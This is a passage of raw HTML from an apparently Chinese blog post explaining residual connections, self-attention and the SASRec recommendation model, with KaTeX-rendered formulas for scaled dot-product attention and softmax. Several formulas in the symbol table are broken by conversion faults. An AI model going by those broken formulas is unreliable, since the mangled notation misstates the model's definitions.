class=\"anchor\" href=\"#应用\">#</a> 应用</h4>\n<p>残差连接最初在 ResNet（残差网络）中得到应用，后来在 Transformer 等模型中广泛使用，成为深度学习模型中的标准组件。</p>\n<h2 id=\"自注意力机制self-attention\"><a class=\"anchor\" href=\"#自注意力机制self-attention\">#</a> 自注意力机制（Self-Attention）</h2>\n<p>自注意力机制是 Transformer 的核心。它的作用是让模型能够 “关注” 输入序列中不同位置的词之间的关系。这是如何做到的：</p>\n<ol>\n<li><strong>输入嵌入（Input Embeddings）</strong>：\n<ul>\n<li>首先，将输入序列中的每个词转换为一个高维向量（嵌入向量）。</li>\n</ul>\n</li>\n<li><strong>生成查询（Query）、键（Key）和值（Value）向量</strong>：\n<ul>\n<li>对每个输入词的嵌入向量，通过不同的线性变换，生成对应的查询、键和值向量。</li>\n</ul>\n</li>\n<li><strong>计算注意力得分（Attention Scores）</strong>：\n<ul>\n<li>对每个词的查询向量和所有词的键向量进行点积运算，得到注意力得分。这个得分表示当前词与其他词的相关性。</li>\n</ul>\n</li>\n<li><strong>归一化注意力得分</strong>：\n<ul>\n<li>使用 Softmax 函数对注意力得分进行归一化，得到每个词的注意力权重。</li>\n</ul>\n</li>\n<li><strong>计算加权和</strong>：\n<ul>\n<li>使用这些注意力权重对所有词的值向量进行加权求和，得到当前词的新的表示。</li>\n</ul>\n</li>\n<li>允许每个词根据其与其他词的相关性进行加权求和，从而捕捉到全局信息。</li>\n</ol>\n<h2 id=\"sasrec\"><a class=\"anchor\" href=\"#sasrec\">#</a> SASRec</h2>\n<h3 id=\"培训简化图\"><a class=\"anchor\" href=\"#培训简化图\">#</a> 培训简化图</h3>\n<p><img data-src=\"https://s2.loli.net/2024/07/09/4buJp2oYK7MVcZz.png\" alt=\"QQ_1720514487872.png\" /></p>\n<h3 id=\"要点\"><a class=\"anchor\" href=\"#要点\">#</a> 要点</h3>\n<ul>\n<li>自我注意：发现句子中单词之间的句法和语意模式</li>\n<li>可以并行加速</li>\n</ul>\n<h3 id=\"符号表\"><a class=\"anchor\" href=\"#符号表\">#</a> 符号表</h3>\n<table>\n<thead>\n<tr>\n<th>符号</th>\n<th>描述</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td><span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mi>U</mi></mrow><annotation encoding=\"application/x-tex\">U</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.68333em;vertical-align:0em;\"></span><span class=\"mord mathnormal\" style=\"margin-right:0.10903em;\">U</span></span></span></span></td>\n<td>用户和物品集合</td>\n</tr>\n<tr>\n<td>$S^u $</td>\n<td>用户 (u) 的历史交互序列：$(S^u_1, S^u_2, ..., S^u _{</td>\n<td>S^u</td>\n<td>})$</td>\n</tr>\n<tr>\n<td N=\"\">d \\in \\mathbb</td>\n<td>潜在向量维度</td>\n</tr>\n<tr>\n<td>$n \\in \\mathbb{N} $</td>\n<td>最大序列长度</td>\n</tr>\n<tr>\n<td N=\"\">b \\in \\mathbb</td>\n<td>自注意力块的数量</td>\n</tr>\n<tr>\n<td>$\\mathbf{M} \\in \\mathbb{R}^{</td>\n<td>I</td>\n<td>\\times d}$</td>\n<td>物品嵌入矩阵</td>\n</tr>\n<tr>\n<td>$\\ \\mathbf<ruby>P} \\in \\mathbb{R}<rp>(</rp><rt>{n \\times d</rt><rp>)</rp></ruby> $</td>\n<td>位置嵌入矩阵</td>\n</tr>\n<tr>\n<td n=\"\" \\times=\"\" d=\"\">\\hat{\\mathbf{E}} \\in \\mathbb{R}^</td>\n<td>输入嵌入矩阵</td>\n</tr>\n<tr>\n<td>$\\mathbf<ruby>S}<rp>(</rp><rt>{(b)</rt><rp>)</rp></ruby> \\in \\mathbb<ruby>R}<rp>(</rp><rt>{n \\times d</rt><rp>)</rp></ruby> $</td>\n<td>第 (b) 个自注意力层后的物品嵌入</td>\n</tr>\n<tr>\n<td>$\\mathbf<ruby>F}<rp>(</rp><rt>{(b)</rt><rp>)</rp></ruby> \\in \\mathbb<ruby>R}<rp>(</rp><rt>{n \\times d</rt><rp>)</rp></ruby> $</td>\n<td>第 (b) 个前馈神经网络层后的物品嵌入</td>\n</tr>\n</tbody>\n</table>\n<h3 id=\"嵌入层\"><a class=\"anchor\" href=\"#嵌入层\">#</a> 嵌入层</h3>\n<p>我们现将序列<span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mo stretchy=\"false\">(</mo><msubsup><mi>S</mi><mn>1</mn><mi>u</mi></msubsup><mo separator=\"true\">,</mo><msubsup><mi>S</mi><mn>2</mn><mi>u</mi></msubsup><mo separator=\"true\">,</mo><mi mathvariant=\"normal\">.</mi><mi mathvariant=\"normal\">.</mi><mi mathvariant=\"normal\">.</mi><mo separator=\"true\">,</mo><msubsup><mi>S</mi><mrow><mi mathvariant=\"normal\">∣</mi><msup><mi>S</mi><mrow><mi>u</mi><mo>−</mo><mn>1</mn></mrow></msup><mi mathvariant=\"normal\">∣</mi></mrow><mi>u</mi></msubsup><mo stretchy=\"false\">)</mo></mrow><annotation encoding=\"application/x-tex\">(S^u_1, S^u_2, ..., S^u _{|S^{u-1}|})</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:1.2469999999999999em;vertical-align:-0.49699999999999994em;\"></span><span class=\"mopen\">(</span><span class=\"mord\"><span class=\"mord mathnormal\" style=\"margin-right:0.05764em;\">S</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.664392em;\"><span style=\"top:-2.4518920000000004em;margin-left:-0.05764em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\">1</span></span></span><span style=\"top:-3.063em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mathnormal mtight\">u</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.24810799999999997em;\"><span></span></span></span></span></span></span><span class=\"mpunct\">,</span><span class=\"mspace\" style=\"margin-right:0.16666666666666666em;\"></span><span class=\"mord\"><span class=\"mord mathnormal\" style=\"margin-right:0.05764em;\">S</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.664392em;\"><span style=\"top:-2.4518920000000004em;margin-left:-0.05764em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\">2</span></span></span><span style=\"top:-3.063em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mathnormal mtight\">u</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.24810799999999997em;\"><span></span></span></span></span></span></span><span class=\"mpunct\">,</span><span class=\"mspace\" style=\"margin-right:0.16666666666666666em;\"></span><span class=\"mord\">.</span><span class=\"mord\">.</span><span class=\"mord\">.</span><span class=\"mpunct\">,</span><span class=\"mspace\" style=\"margin-right:0.16666666666666666em;\"></span><span class=\"mord\"><span class=\"mord mathnormal\" style=\"margin-right:0.05764em;\">S</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.6643919999999999em;\"><span style=\"top:-2.378em;margin-left:-0.05764em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mtight\">∣</span><span class=\"mord mtight\"><span class=\"mord mathnormal mtight\" style=\"margin-right:0.05764em;\">S</span><span class=\"msupsub\"><span class=\"vlist-t\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.7463142857142857em;\"><span style=\"top:-2.786em;margin-right:0.07142857142857144em;\"><span class=\"pstrut\" style=\"height:2.5em;\"></span><span class=\"sizing reset-size3 size1 mtight\"><span class=\"mord mtight\"><span class=\"mord mathnormal mtight\">u</span><span class=\"mbin mtight\">−</span><span class=\"mord mtight\">1</span></span></span></span></span></span></span></span></span><span class=\"mord mtight\">∣</span></span></span></span><span style=\"top:-3.063em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mathnormal mtight\">u</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.49699999999999994em;\"><span></span></span></span></span></span></span><span class=\"mclose\">)</span></span></span></span> 变换为固定长度的序列<span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mi>s</mi><mo>=</mo><mo stretchy=\"false\">(</mo><msub><mi>s</mi><mn>1</mn></msub><mo separator=\"true\">,</mo><msub><mi>s</mi><mn>2</mn></msub><mo separator=\"true\">,</mo><mi mathvariant=\"normal\">.</mi><mi mathvariant=\"normal\">.</mi><mi mathvariant=\"normal\">.</mi><mo separator=\"true\">,</mo><msub><mi>s</mi><mi>n</mi></msub><mo stretchy=\"false\">)</mo></mrow><annotation encoding=\"application/x-tex\">s=(s_1,s_2,...,s_n)</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.43056em;vertical-align:0em;\"></span><span class=\"mord mathnormal\">s</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mrel\">=</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:1em;vertical-align:-0.25em;\"></span><span class=\"mopen\">(</span><span class=\"mord\"><span class=\"mord mathnormal\">s</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.30110799999999993em;\"><span style=\"top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\">1</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span><span class=\"mpunct\">,</span><span class=\"mspace\" style=\"margin-right:0.16666666666666666em;\"></span><span class=\"mord\"><span class=\"mord mathnormal\">s</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.30110799999999993em;\"><span style=\"top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\">2</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span><span class=\"mpunct\">,</span><span class=\"mspace\" style=\"margin-right:0.16666666666666666em;\"></span><span class=\"mord\">.</span><span class=\"mord\">.</span><span class=\"mord\">.</span><span class=\"mpunct\">,</span><span class=\"mspace\" style=\"margin-right:0.16666666666666666em;\"></span><span class=\"mord\"><span class=\"mord mathnormal\">s</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.151392em;\"><span style=\"top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mathnormal mtight\">n</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span><span class=\"mclose\">)</span></span></span></span>，其中 n 表示模型可以处理的最大长度，如果序列长度大于 n 则考虑最近的 n 个动作，如果序列长度小于 n，则在左边重复添加一个 ' 填充 ' 项，直到长度为 N 为止 0。其创建了一个项目嵌入矩阵<span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mi mathvariant=\"bold\">M</mi><mo>∈</mo><msup><mi mathvariant=\"double-struck\">R</mi><mrow><mi mathvariant=\"normal\">∣</mi><mi>I</mi><mi mathvariant=\"normal\">∣</mi><mo>×</mo><mi>d</mi></mrow></msup></mrow><annotation encoding=\"application/x-tex\">\\mathbf{M} \\in \\mathbb{R}^{ |I| \\times d}</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.72521em;vertical-align:-0.0391em;\"></span><span class=\"mord\"><span class=\"mord mathbf\">M</span></span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mrel\">∈</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:0.8879999999999999em;vertical-align:0em;\"></span><span class=\"mord\"><span class=\"mord\"><span class=\"mord mathbb\">R</span></span><span class=\"msupsub\"><span class=\"vlist-t\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.8879999999999999em;\"><span style=\"top:-3.063em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mtight\">∣</span><span class=\"mord mathnormal mtight\" style=\"margin-right:0.07847em;\">I</span><span class=\"mord mtight\">∣</span><span class=\"mbin mtight\">×</span><span class=\"mord mathnormal mtight\">d</span></span></span></span></span></span></span></span></span></span></span></span>，其中 d 是潜在维数，检索输入嵌入矩阵。</p>\n<h3 id=\"自注意力缩放点积注意力计算过程\"><a class=\"anchor\" href=\"#自注意力缩放点积注意力计算过程\">#</a> 自注意力缩放点积注意力计算过程</h3>\n<p><span class=\"katex-display\"><span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\" display=\"block\"><semantics><mrow><mtext>Attention</mtext><mo stretchy=\"false\">(</mo><mi mathvariant=\"bold\">Q</mi><mo separator=\"true\">,</mo><mi mathvariant=\"bold\">K</mi><mo separator=\"true\">,</mo><mi mathvariant=\"bold\">V</mi><mo stretchy=\"false\">)</mo><mo>=</mo><mtext>softmax</mtext><mrow><mo fence=\"true\">(</mo><mfrac><mrow><mi mathvariant=\"bold\">Q</mi><msup><mi mathvariant=\"bold\">K</mi><mi>T</mi></msup></mrow><msqrt><mi>d</mi></msqrt></mfrac><mo fence=\"true\">)</mo></mrow><mi mathvariant=\"bold\">V</mi></mrow><annotation encoding=\"application/x-tex\">\\text{Attention}(\\mathbf{Q},\\mathbf{K},\\mathbf{V})=\\text{softmax}\\left(\\frac{\\mathbf{Q}\\mathbf{K}^T}{\\sqrt{d}}\\right)\\mathbf{V}\n</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:1em;vertical-align:-0.25em;\"></span><span class=\"mord text\"><span class=\"mord\">Attention</span></span><span class=\"mopen\">(</span><span class=\"mord\"><span class=\"mord mathbf\">Q</span></span><span class=\"mpunct\">,</span><span class=\"mspace\" style=\"margin-right:0.16666666666666666em;\"></span><span class=\"mord\"><span class=\"mord mathbf\">K</span></span><span class=\"mpunct\">,</span><span class=\"mspace\" style=\"margin-right:0.16666666666666666em;\"></span><span class=\"mord\"><span class=\"mord mathbf\" style=\"margin-right:0.01597em;\">V</span></span><span class=\"mclose\">)</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mrel\">=</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:2.468361em;vertical-align:-0.95003em;\"></span><span class=\"mord text\"><span class=\"mord\">softmax</span></span><span class=\"mspace\" style=\"margin-right:0.16666666666666666em;\"></span><span class=\"minner\"><span class=\"mopen delimcenter\" style=\"top:0em;\"><span class=\"delimsizing size3\">(</span></span><span class=\"mord\"><span class=\"mopen nulldelimiter\"></span><span class=\"mfrac\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:1.5183309999999999em;\"><span style=\"top:-2.17778em;\"><span class=\"pstrut\" style=\"height:3em;\"></span><span class=\"mord\"><span class=\"mord sqrt\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.93222em;\"><span class=\"svg-align\" style=\"top:-3em;\"><span class=\"pstrut\" style=\"height:3em;\"></span><span class=\"mord\" style=\"padding-left:0.833em;\"><span class=\"mord mathnormal\">d</span></span></span><span style=\"top:-2.89222em;\"><span class=\"pstrut\" style=\"height:3em;\"></span><span class=\"hide-tail\" style=\"min-width:0.853em;height:1.08em;\"><svg width='400em' height='1.08em' viewBox='0 0 400000 1080' preserveAspectRatio='xMinYMin slice'><path d='M95,702\nc-2.7,0,-7.17,-2.7,-13.5,-8c-5.8,-5.3,-9.5,-10,-9.5,-14\nc0,-2,0.3,-3.3,1,-4c1.3,-2.7,23.83,-20.7,67.5,-54\nc44.2,-33.3,65.8,-50.3,66.5,-51c1.3,-1.3,3,-2,5,-2c4.7,0,8.7,3.3,12,10\ns173,378,173,378c0.7,0,35.3,-71,104,-213c68.7,-142,137.5,-285,206.5,-429\nc69,-144,104.5,-217.7,106.5,-221\nl0 -0\nc5.3,-9.3,12,-14,20,-14\nH400000v40H845.2724\ns-225.272,467,-225.272,467s-235,486,-235,486c-2.7,4.7,-9,7,-19,7\nc-6,0,-10,-1,-12,-3s-194,-422,-194,-422s-65,47,-65,47z\nM834 80h400000v40h-400000z'/></svg></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.10777999999999999em;\"><span></span></span></span></span></span></span></span><span style=\"top:-3.23em;\"><span class=\"pstrut\" style=\"height:3em;\"></span><span class=\"frac-line\" style=\"border-bottom-width:0.04em;\"></span></span><span style=\"top:-3.677em;\"><span class=\"pstrut\" style=\"height:3em;\"></span><span class=\"mord\"><span class=\"mord\"><span class=\"mord mathbf\">Q</span></span><span class=\"mord\"><span class=\"mord\"><span class=\"mord mathbf\">K</span></span><span class=\"msupsub\"><span class=\"vlist-t\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.8413309999999999em;\"><span style=\"top:-3.063em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mathnormal mtight\" style=\"margin-right:0.13889em;\">T</span></span></span></span></span></span></span></span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.93em;\"><span></span></span></span></span></span><span class=\"mclose nulldelimiter\"></span></span><span class=\"mclose delimcenter\" style=\"top:0em;\"><span class=\"delimsizing size3\">)</span></span></span><span class=\"mspace\" style=\"margin-right:0.16666666666666666em;\"></span><span class=\"mord\"><span class=\"mord mathbf\" style=\"margin-right:0.01597em;\">V</span></span></span></span></span></span></p>\n<h4 id=\"解释\"><a class=\"anchor\" href=\"#解释\">#</a> 解释</h4>\n<ul>\n<li><strong>Q</strong>：查询矩阵</li>\n<li><strong>K</strong>：键矩阵</li>\n<li><strong>V</strong>：值矩阵</li>\n<li><strong>点积计算</strong>：首先查询矩阵 Q 和建矩阵 K 的转置<span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><msup><mi>K</mi><mi>T</mi></msup></mrow><annotation encoding=\"application/x-tex\">K^T</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.8413309999999999em;vertical-align:0em;\"></span><span class=\"mord\"><span class=\"mord mathnormal\" style=\"margin-right:0.07153em;\">K</span><span class=\"msupsub\"><span class=\"vlist-t\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.8413309999999999em;\"><span style=\"top:-3.063em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mathnormal mtight\" style=\"margin-right:0.13889em;\">T</span></span></span></span></span></span></span></span></span></span></span> 的点积。这个点积结果表示查询和键之间的相似度</li>\n<li><strong>缩放</strong>：由于点积的结果在维度较大时可能会产生很大的数值，因此我们需要将点积结果除以<span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><msqrt><mi>d</mi></msqrt></mrow><annotation encoding=\"application/x-tex\">\\sqrt d</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:1.04em;vertical-align:-0.10777999999999999em;\"></span><span class=\"mord sqrt\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.93222em;\"><span class=\"svg-align\" style=\"top:-3em;\"><span class=\"pstrut\" style=\"height:3em;\"></span><span class=\"mord mathnormal\" style=\"padding-left:0.833em;\">d</span></span><span style=\"top:-2.89222em;\"><span class=\"pstrut\" style=\"height:3em;\"></span><span class=\"hide-tail\" style=\"min-width:0.853em;height:1.08em;\"><svg width='400em' height='1.08em' viewBox='0 0 400000 1080' preserveAspectRatio='xMinYMin slice'><path d='M95,702\nc-2.7,0,-7.17,-2.7,-13.5,-8c-5.8,-5.3,-9.5,-10,-9.5,-14\nc0,-2,0.3,-3.3,1,-4c1.3,-2.7,23.83,-20.7,67.5,-54\nc44.2,-33.3,65.8,-50.3,66.5,-51c1.3,-1.3,3,-2,5,-2c4.7,0,8.7,3.3,12,10\ns173,378,173,378c0.7,0,35.3,-71,104,-213c68.7,-142,137.5,-285,206.5,-429\nc69,-144,104.5,-217.7,106.5,-221\nl0 -0\nc5.3,-9.3,12,-14,20,-14\nH400000v40H845.2724\ns-225.272,467,-225.272,467s-235,486,-235,486c-2.7,4.7,-9,7,-19,7\nc-6,0,-10,-1,-12,-3s-194,-422,-194,-422s-65,47,-65,47z\nM834 80h400000v40h-400000z'/></svg></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.10777999999999999em;\"><span></span></span></span></span></span></span></span></span> 进行缩放，其中<span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mi>d</mi></mrow><annotation encoding=\"application/x-tex\">d</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.69444em;vertical-align:0em;\"></span><span class=\"mord mathnormal\">d</span></span></span></span> 是键向量的维度。这样做的目的是为了避免在计算 softmax 时数值较大，导致梯度消失问题。</li>\n<li><strong>softmax</strong>：通过 softmax 函数将缩放后的点积结果转换为概率分布。softmax 的作用是将每个查询与所有键的相似度转化为权重，这些权重表示每个键对当前查询的重要性。</li>\n<li><strong>加权求和</strong>：最后，将这些权重与值矩阵 V 相乘，得到最终的注意力输出。这一步的目的是根据查询对键的注意力权重，对值进行加权求和，从而得到每个查询对应的加权值。</li>\n</ul>\n<h4 id=\"softmax-函数\"><a class=\"anchor\" href=\"#softmax-函数\">#</a> softmax 函数</h4>\n<p><span class=\"katex-display\"><span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\" display=\"block\"><semantics><mrow><mrow><mi mathvariant=\"normal\">s</mi><mi mathvariant=\"normal\">o</mi><mi mathvariant=\"normal\">f</mi><mi mathvariant=\"normal\">t</mi><mi mathvariant=\"normal\">m</mi><mi mathvariant=\"normal\">a</mi><mi mathvariant=\"normal\">x</mi></mrow><mo stretchy=\"false\">(</mo><msub><mi>z</mi><mi>i</mi></msub><mo stretchy=\"false\">)</mo><mo>=</mo><mfrac><msup><mi>e</mi><msub><mi>z</mi><mi>i</mi></msub></msup><mrow><munderover><mo>∑</mo><mrow><mi>j</mi><mo>=</mo><mn>1</mn></mrow><mi>K</mi></munderover><msup><mi>e</mi><msub><mi>z</mi><mi>j</mi></msub></msup></mrow></mfrac></mrow><annotation encoding=\"application/x-tex\">\\mathrm{softmax}(z_i)=\\frac{e^{z_i}}{\\sum_{j=1}^Ke^{z_j}}\n</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:1em;vertical-align:-0.25em;\"></span><span class=\"mord\"><span class=\"mord mathrm\">s</span><span class=\"mord mathrm\">o</span><span class=\"mord mathrm\" style=\"margin-right:0.07778em;\">f</span><span class=\"mord mathrm\">t</span><span class=\"mord mathrm\">m</span><span class=\"mord mathrm\">a</span><span class=\"mord mathrm\">x</span></span><span class=\"mopen\">(</span><span class=\"mord\"><span class=\"mord mathnormal\" style=\"margin-right:0.04398em;\">z</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.31166399999999994em;\"><span style=\"top:-2.5500000000000003em;margin-left:-0.04398em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mathnormal mtight\">i</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span><span class=\"mclose\">)</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mrel\">=</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:2.648441em;vertical-align:-1.3070490000000001em;\"></span><span class=\"mord\"><span class=\"mopen nulldelimiter\"></span><span class=\"mfrac\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:1.341392em;\"><span style=\"top:-2.128769em;\"><span class=\"pstrut\" style=\"height:3em;\"></span><span class=\"mord\"><span class=\"mop\"><span class=\"mop op-symbol small-op\" style=\"position:relative;top:-0.0000050000000000050004em;\">∑</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.981231em;\"><span style=\"top:-2.40029em;margin-left:0em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mathnormal mtight\" style=\"margin-right:0.05724em;\">j</span><span class=\"mrel mtight\">=</span><span class=\"mord mtight\">1</span></span></span></span><span style=\"top:-3.2029em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mathnormal mtight\" style=\"margin-right:0.07153em;\">K</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.43581800000000004em;\"><span></span></span></span></span></span></span><span class=\"mspace\" style=\"margin-right:0.16666666666666666em;\"></span><span class=\"mord\"><span class=\"mord mathnormal\">e</span><span class=\"msupsub\"><span class=\"vlist-t\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.6064620000000001em;\"><span style=\"top:-3.0050700000000004em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mtight\"><span class=\"mord mathnormal mtight\" style=\"margin-right:0.04398em;\">z</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.3280857142857143em;\"><span style=\"top:-2.357em;margin-left:-0.04398em;margin-right:0.07142857142857144em;\"><span class=\"pstrut\" style=\"height:2.5em;\"></span><span class=\"sizing reset-size3 size1 mtight\"><span class=\"mord mathnormal mtight\" style=\"margin-right:0.05724em;\">j</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.2818857142857143em;\"><span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span><span style=\"top:-3.23em;\"><span class=\"pstrut\" style=\"height:3em;\"></span><span class=\"frac-line\" style=\"border-bottom-width:0.04em;\"></span></span><span style=\"top:-3.677em;\"><span class=\"pstrut\" style=\"height:3em;\"></span><span class=\"mord\"><span class=\"mord\"><span class=\"mord mathnormal\">e</span><span class=\"msupsub\"><span class=\"vlist-t\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.664392em;\"><span style=\"top:-3.063em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mtight\"><span class=\"mord mathnormal mtight\" style=\"margin-right:0.04398em;\">z</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.3280857142857143em;\"><span style=\"top:-2.357em;margin-left:-0.04398em;margin-right:0.07142857142857144em;\"><span class=\"pstrut\" style=\"height:2.5em;\"></span><span class=\"sizing reset-size3 size1 mtight\"><span class=\"mord mathnormal mtight\">i</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" 